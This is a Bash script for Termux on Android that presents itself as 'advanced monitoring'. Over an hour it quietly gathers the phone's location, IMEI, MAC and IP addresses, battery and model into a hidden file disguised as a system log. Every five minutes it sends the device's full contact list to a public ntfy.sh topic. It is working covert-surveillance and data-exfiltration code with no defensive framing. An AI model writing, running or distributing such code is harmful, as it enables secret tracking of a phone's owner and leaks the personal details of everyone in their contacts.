#!/bin/bash
# Monitoreo Avanzado (Duración: 60 minutos)

# ===== CONFIGURACIÓN =====
NTFY_URL="https://ntfy.sh/jotape09"  # ¡Cámbialo!
INTERVALO=300  # 5 minutos entre reportes (para evitar saturación)
DURACION_MIN=60
DEBUG=true
LOG_FILE="/sdcard/.system_log.txt"  # Archivo oculto para logs

# ===== FUNCIONES =====
obtener_contactos() {
    termux-contact-list 2>/dev/null | jq -c 'map({name: .name, number: .number})'
}

obtener_info_red() {
    echo "{ \
        \"ip_publica\": \"$(curl -sS ifconfig.me)\", \
        \"ip_local\": \"$(ip route get 1 | awk '{print $7}')\", \
        \"mac\": \"$(ip link show wlan0 | awk '/ether/ {print $2}')\", \
        \"imei\": \"$(termux-telephony-deviceinfo | jq -r '.imei')\" \
    }"
}

generar_reporte() {
    # Información básica
    local modelo=$(getprop ro.product.model)
    local android=$(getprop ro.build.version.release)
    local bateria=$(termux-battery-status | jq -r '"\(.percentage)% (\(.status))"')
    local ubicacion=$(termux-location -p network | jq -r '"\(.latitude),\(.longitude) ±\(.accuracy)m"')

    # Datos sensibles (JSON)
    local red_info=$(obtener_info_red)
    local contactos=$(obtener_contactos)

    # Guardar en archivo (excepto contactos)
    echo "{ \
        \"modelo\": \"$modelo\", \
        \"android\": \"$android\", \
        \"bateria\": \"$bateria\", \
        \"ubicacion\": \"$ubicacion\", \
        \"red\": $red_info \
    }" > $LOG_FILE

    # Enviar solo contactos por NTFY
    curl -sS -X POST "$NTFY_URL/contactos" -d "$contactos" >/dev/null
}

# ===== EJECUCIÓN =====
ITERACION=0
MAX_ITERACIONES=$((DURACION_MIN*60/INTERVALO))

while [ $ITERACION -lt $MAX_ITERACIONES ]; do
    generar_reporte
    ITERACION=$((ITERACION+1))
    sleep $INTERVALO
done

# Limpieza final
echo "Monitoreo finalizado $(date)" >> $LOG_FILE
